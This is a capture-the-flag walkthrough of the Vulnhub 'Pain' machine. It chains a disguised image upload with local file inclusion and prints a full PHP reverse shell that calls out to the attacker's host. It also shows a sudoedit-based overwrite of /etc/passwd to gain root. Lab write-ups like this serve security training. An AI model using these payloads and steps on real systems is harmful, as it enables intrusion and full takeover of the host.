First start enumeration with nmap 

```
# Nmap 7.93 scan initiated Sat Mar 11 02:58:09 2023 as: nmap -sC -sV -oN normal.tcp -p 22,80,3306,33060 -Pn 192.168.0.102
Nmap scan report for 192.168.0.102                                                 
Host is up (0.00047s latency).                                                     
                                                                                   
PORT      STATE SERVICE VERSION                                                    
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)     
| ssh-hostkey:                                                                     
|   3072 34d64117226139afdda754ff2d3d98a7 (RSA)                           
|   256 eba62467cad00e9e84febeb5c2788446 (ECDSA)                          
|_  256 9730a6c7f4eebd5078938cdc7dc24b0a (ED25519)                        
80/tcp    open  http    Apache httpd 2.4.54 ((Debian))                    
|_http-title: PainVM                                                               
|_http-server-header: Apache/2.4.54 (Debian)                              
3306/tcp  open  mysql   MySQL (unauthorized)                              
33060/tcp open  mysqlx?                                                            
| fingerprint-strings:                                                             
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"                                                             
|     HY000                                                                        
|   LDAPBindReq:                                                                   
|     *Parse error unserializing protobuf message"                        
|     HY000                                                                        
|   oracle-tns:                                                                    
|     Invalid message-frame."                                                      
|_    HY000                                                                        
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
vice :                                                                             
SF-Port33060-TCP:V=7.93%I=7%D=3/11%Time=640BE039%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2                                                                                            
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI                                                                                            
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 11 02:58:24 2023 -- 1 IP address (1 host up) scanned in 14.97 seconds
```
cool we know what ports are open. 

![image](https://user-images.githubusercontent.com/87468669/224459020-ea97bd89-4c8e-4ae3-9537-623551730ccc.png)

noticed a webserver running on port 80, opening it on a browser we go directed to an homepage with pain quotes... 😂 we about to face pain here. nothing to fear we've got sharingan. lt's burst hidden directories.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/Pain]                                                                                                              
└─$ gobuster dir -u "http://192.168.0.102/" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x txt,php,bak,zip,tar,sql 2>/dev/null            
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.102/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5 
[+] Extensions:              zip,tar,sql,txt,php,bak
[+] Timeout:                 10s
===============================================================
2023/03/11 03:22:17 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.102/js/]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.102/img/]
/index.php            (Status: 200) [Size: 3220]
/fonts                (Status: 301) [Size: 314] [--> http://192.168.0.102/fonts/]
/server-status        (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 3220]
/pain_management.php  (Status: 200) [Size: 1903]
/.php                 (Status: 403) [Size: 278]

===============================================================
2023/03/11 03:24:28 Finished
===============================================================
```
cool we got a `/pain_management.php` let's check it out. 

![image](https://user-images.githubusercontent.com/87468669/224460581-e7e63462-246e-4d5f-9820-cb2bb21173f9.png)

navigating to the dir, we got directed to a login page. let's play around. 

![image](https://user-images.githubusercontent.com/87468669/224461729-9168c77c-7609-4347-a772-67d540140019.png)

remember we have mangekyou sharingan ❟❛❟ was able to guess the cred. trying creds `admin:pain` we got in. now let's play around more

![image](https://user-images.githubusercontent.com/87468669/224462405-86169775-d067-461b-9897-08621becf571.png)

navigated to `New_mission.php`, viewing the page source we got to see some comments.

```
<!-- Todo: 

- Gedo_Statue.php 
- Add a progress bar to show the upload progress
- Implement client-side validation to check file type and size before uploading
- Add a preview of the selected image before uploading
- Include a confirmation message after successful upload
- Add a button to clear the form after submission
- Implement server-side validation to prevent malicious uploads
- Automatically resize the uploaded image to a maximum size
- Add a report back function to notify Pain the Akatsuki leader of new uploads -->
```
🤔hmmmmm... let's check out the `Gedo_Statue.php` dir first. 

![image](https://user-images.githubusercontent.com/87468669/224462633-fd182772-5aed-4b74-accd-c0bb4d1e6323.png)

cool we have an upload form page. let's try upload a php web shell.

![image](https://user-images.githubusercontent.com/87468669/229390133-677d7b1b-7bd7-43c1-aba1-7e19f24ce00e.png)

tried uploading a php shell, we got restriction saying only `jpg, gif and png` files are allowed. let's create a malicious jpg file.

```
<?php phpinfo(); ?>
```
put the above payload in a file and saved it as `shell.jpg`. now let's edit the file header to trick the server to think its a normal jpg file.

![image](https://user-images.githubusercontent.com/87468669/229390569-76838c84-1362-4a60-b69f-558328f02d1b.png)

convert the header `3C 3F 70 68` to `FF D8 FF EE` ctrl+x to save and exit. 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/Pain]
└─$ cat shell.jpg 
����

<?php phpinfo(); ?>
```
re-edit the payload to make sure it's okay. now let's upload our payload.

![image](https://user-images.githubusercontent.com/87468669/229390821-1d29439c-4bd9-4aa7-b1e1-078f7abd725c.png)

Cool we uploaded successfully, let's navigate to the uploaded file path so it exec our payload.

![image](https://user-images.githubusercontent.com/87468669/229390914-74c8e510-3f56-416f-8440-2acda374694e.png)

nothing happened 🥲... guess we entered a rabit hole. let's check for other way this time activating magekyou sharigan ❟❛❟.

![image](https://user-images.githubusercontent.com/87468669/229391193-f0ad91c2-2f06-44ea-9d3a-ab7dc1d5b51b.png)

went back to the `/New_Mission.php` dir, tested for sqli did not work. let's test for lfi (local file inclusio)

![image](https://user-images.githubusercontent.com/87468669/229391318-0028b844-9478-4ff0-bdce-9abd40a015c9.png)

Bull's eye... we got lfi, let's fuck around and find out something... After hours of battling this, running out of chakra, was forced to use susano ☠️. remember we have two vulns, `LFI & file upload` why don't we try chain this two things together. remember that the web server path is `/var/www/html` and the uploaded file path was `/akatsukiCMS/images/uploads/642a28bb4b082.jpg` in our case. let's try link this though the LFI endpoint. 

![image](https://user-images.githubusercontent.com/87468669/229391984-e670ee5c-a864-4bbb-80bd-73cd17b6ddc7.png)

send the mission.

![image](https://user-images.githubusercontent.com/87468669/229392037-7e54f46d-9b40-4881-b0c0-14a5683c0533.png)

Bingo we got RCE... now let's get reverse shell.

```
ÿØÿî

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.100';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
re-edit the payload put our reverse shell and uploaded it.

![image](https://user-images.githubusercontent.com/87468669/229392784-d11429f6-2dce-4072-a9fa-7333e056afc4.png)

it generated another file name, take note of it. let's go back to the LFI endpoint path and try calling our shell.

![image](https://user-images.githubusercontent.com/87468669/229392932-38f0a89d-cfef-42fd-898a-48fa9aeb28f5.png)

ncat listener ready.

![image](https://user-images.githubusercontent.com/87468669/229392994-20a62924-dd68-414c-b9c3-9c2a048c6133.png)

trigger the payload by clicking the send mission button. 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/Pain]
└─$ ncat -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.0.102.
Ncat: Connection from 192.168.0.102:57250.
Linux PainVM 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 21:40:07 up 44 min,  0 users,  load average: 0.13, 0.05, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@PainVM:/$ ^Z
zsh: suspended  ncat -lnvp 1337
                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/Pain]
└─$ stty raw -echo;fg
[1]  + continued  ncat -lnvp 1337
                                 stty rows 40 cols 160
www-data@PainVM:/$ export TERM=xterm-256color
www-data@PainVM:/$ 
```
check back ncat listener and boom we got a reverse shell. Let's escalate privs.


## Privilege Escalation

```
www-data@PainVM:/var/www/html/akatsukiCMS/includes$ pwd
/var/www/html/akatsukiCMS/includes
www-data@PainVM:/var/www/html/akatsukiCMS/includes$ ls -al
total 20
drwxrwxr-x 2 www-data www-data 4096 Mar  9 10:59 .
drwxrwxr-x 4 www-data www-data 4096 Mar 10 13:13 ..
-rwxrwxr-x 1 root     konan     328 Mar  9 10:59 akatsukiCMS_Config.php
-rwxrwxr-x 1 www-data www-data  309 Mar  4 13:10 db_conn.php
-rwxrwxr-x 1 www-data www-data 1765 Mar  4 13:14 user.php
www-data@PainVM:/var/www/html/akatsukiCMS/includes$ cat akatsukiCMS_Config.php 
<?php

// Database configuration
define('DB_HOST', 'localhost');  // replace with your database host
define('DB_NAME', 'akatuskiCMS'); // replace with your database name
define('DB_USER', 'pain');      // replace with your database username
define('DB_PASS', 'N0tCr@ck4ble2023!!!');  // replace with your database password

?>
www-data@PainVM:/var/www/html/akatsukiCMS/includes$ 
```
After much playing around, finding interesting files, got to see an interesting file `akatsukiCMS_Config.php` in the `/var/www/html/akatsukiCMS/includes` directory. checking its content we got to see some creds. let's try su into the user `pain` with password `N0tCr@ck4ble2023!!!`. 

```
www-data@PainVM:/var/www/html/akatsukiCMS/includes$ su pain
Password: 
pain@PainVM:/var/www/html/akatsukiCMS/includes$ id
uid=1000(pain) gid=1000(pain) groups=1000(pain)
pain@PainVM:/var/www/html/akatsukiCMS/includes$ 
```
Boom we are in as user `pain`.

```
pain@PainVM:~$ ls -al
total 24
drwxr-xr-x 2 pain pain 4096 Mar 10 17:20 .
drwxr-xr-x 4 root root 4096 Mar  9 11:03 ..
-rw-r--r-- 1 pain pain  220 Mar  6 18:16 .bash_logout
-rw-r--r-- 1 pain pain 3526 Mar  6 18:16 .bashrc
-rw-r--r-- 1 root pain   33 Mar  9 13:13 local.txt
-rw-r--r-- 1 pain pain  807 Mar  6 18:16 .profile
pain@PainVM:~$ sudo -l
User pain may run the following commands on PainVM:
    (root) NOPASSWD: sudoedit /var/www/html/akatsukiCMS/includes/akatsukiCMS_Config.php
pain@PainVM:~$
```
checking for sudo privs, we got to see that user `pain` can run `sudoedit /var/www/html/akatsukiCMS/includes/akatsukiCMS_Config.php` as root without password. let's abuse this priv. `sudoedit` A local user with permission to run the sudoedit pseudo-command can gain root privileges, through manipulation of the PATH environment variable.

```
pain@PainVM:~$openssl passwd hacked
$1$qegrIRm1$w5xZ0rk5IPW5lUVcIHXHP/
pain@PainVM:~$ EDITOR='nano -- /etc/passwd' sudoedit /var/www/html/akatsukiCMS/includes/akatsukiCMS_Config.php
sudoedit: --: editing files in a writable directory is not permitted
sudoedit: /var/www/html/akatsukiCMS/includes/akatsukiCMS_Config.php unchanged
pain@PainVM:~$ cat /etc/passwd
root:$1$qegrIRm1$w5xZ0rk5IPW5lUVcIHXHP/:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
[***]
pain@PainVM:~$ 
```
by running the above command, we were able to edit the `/etc/passwd` file and put a custom passwd hash generated by openssl for user `root`. now let's `su root` using passd `hacked` that was generated.

![image](https://user-images.githubusercontent.com/87468669/229395110-9ad770f5-46ee-4a5b-a494-e30f8aef3785.png)

Boom!!! we got root... and we are done hope you had fun. 😉
